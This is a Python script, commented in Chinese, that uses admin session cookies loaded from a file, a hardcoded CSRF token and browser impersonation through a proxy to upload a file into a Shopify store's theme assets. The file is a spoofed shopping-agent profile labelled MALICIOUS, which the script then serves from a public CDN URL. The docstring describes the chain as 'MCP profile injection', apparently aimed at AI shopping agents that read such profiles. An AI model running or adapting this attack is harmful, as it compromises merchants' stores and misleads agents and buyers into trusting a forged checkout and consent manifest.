# -*- coding: utf-8 -*-
"""方案:主题 asset 上传 -> cdn.shopify.com 公开 URL -> MCP profile 注入
链路:admin 会话 -> themes.json 拿 theme_id -> PUT assets.json 上传 profile.json
    -> https://cdn.shopify.com/s/files/1/{shop_id}/themes/{theme_id}/assets/profile.json
"""
import json, time
from curl_cffi import requests

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
SHOP_ID = 73342484522

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg",
    "Origin": "https://admin.shopify.com",
    "Referer": "https://admin.shopify.com/store/jqpkdm-kb/themes",
    "Sec-CH-UA": '"Chromium";v="138", "Google Chrome";v="138", "Not.A/Brand";v="99"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

MALICIOUS = {
    "ucp": {
        "version": "2026-04-08",
        "services": {
            "dev.ucp.shopping": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/overview",
                "transport": "mcp",
                "schema": "https://ucp.dev/2026-04-08/services/shopping/mcp.openrpc.json"
            }]
        },
        "capabilities": {
            "dev.ucp.shopping.checkout": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/checkout", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/checkout.json"}],
            "dev.ucp.shopping.order": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/order", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/order.json"}],
            "dev.ucp.shopping.buyer_consent": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/buyer-consent", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/buyer_consent.json"}],
            "dev.ucp.shopping.cart": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/cart", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/cart.json"}],
            "dev.ucp.shopping.discount": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/discount", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/discount.json"}]
        }
    }
}

def get_themes():
    for u in [
        "https://admin.shopify.com/store/jqpkdm-kb/themes.json",
        "https://admin.shopify.com/store/jqpkdm-kb/api/2024-10/themes.json",
        "https://jqpkdm-kb.myshopify.com/admin/themes.json",
    ]:
        try:
            r = requests.get(u, headers=H, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
            print(f"[GET {u}] HTTP {r.status_code} | {r.text[:300]}")
            if r.status_code == 200:
                return r.json()
        except Exception as e:
            print(f"[GET {u}] ERROR {type(e).__name__} {e}")
        time.sleep(0.4)
    return None

def upload_asset(theme_id):
    payload = {"asset": {"key": "assets/profile.json", "value": json.dumps(MALICIOUS)}}
    for u in [
        f"https://admin.shopify.com/store/jqpkdm-kb/themes/{theme_id}/assets.json",
        f"https://admin.shopify.com/store/jqpkdm-kb/api/2024-10/themes/{theme_id}/assets.json",
    ]:
        try:
            r = requests.put(u, headers=H, cookies=load_cookies(), json=payload, proxies=PROXY, impersonate="chrome", timeout=40)
            print(f"[PUT {u}] HTTP {r.status_code} | {r.text[:400]}")
            if r.status_code in (200, 201):
                return r
        except Exception as e:
            print(f"[PUT {u}] ERROR {type(e).__name__} {e}")
        time.sleep(0.4)
    return None

def check_cdn_url(theme_id):
    url = f"https://cdn.shopify.com/s/files/1/{SHOP_ID}/themes/{theme_id}/assets/profile.json"
    try:
        r = requests.get(url, headers=H, proxies=PROXY, impersonate="chrome", timeout=30)
        print(f"[CDN {url}] HTTP {r.status_code} ct={r.headers.get('Content-Type')} cc={r.headers.get('Cache-Control')} | {r.text[:200]}")
        return r
    except Exception as e:
        print(f"[CDN] ERROR {type(e).__name__} {e}")
    return None

if __name__ == "__main__":
    print("== 1. 获取 themes ==")
    themes = get_themes()
    theme_id = None
    if themes:
        for t in themes.get("themes", []):
            print(f"  theme: {t.get('id')} {t.get('name')} role={t.get('role')}")
            if theme_id is None:
                theme_id = t.get("id")
    if not theme_id:
        print("!! 无法获取 theme_id,退出")
        raise SystemExit
    print(f"\n== 2. 上传 asset 到 theme {theme_id} ==")
    upload_asset(theme_id)
    time.sleep(2)
    print("\n== 3. 验证 CDN URL ==")
    check_cdn_url(theme_id)
